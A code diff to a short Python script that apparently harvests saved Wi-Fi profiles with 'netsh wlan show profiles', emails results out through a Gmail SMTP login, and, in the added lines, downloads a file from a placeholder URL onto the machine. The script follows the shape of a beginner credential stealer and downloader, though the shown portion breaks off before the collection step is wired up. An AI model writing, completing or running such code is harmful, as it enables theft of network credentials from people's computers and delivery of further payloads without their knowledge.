@@ -1,12 +1,19 @@
 import subprocess
 import smtplib
 import re 
+import requests
+
+def get_file(url):
+    get_responce = requests.get(url)
+    with open("<name_of the file>", "<w|r|wr|wb...>") as output_file: # upon printing the response. For the content we can check which kind of data is present in the file eg. binary data -> that should be write-binary "wb"
+        output_file.write(get_responce.content)
+get_file("<URL of the file need to download into the system>") 
 
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
     server.login(email, password)
-    server.sendmail(email, email, message) #here email1 and email2 are sender and reciever, only for the purpose of checking i had used both as email, email
+    server.sendmail(email, email, message) #here email1 and email2 are sender and receiver, only to check I had used both as my_email
     server.quit()
 
 command = 'netsh wlan show profiles'
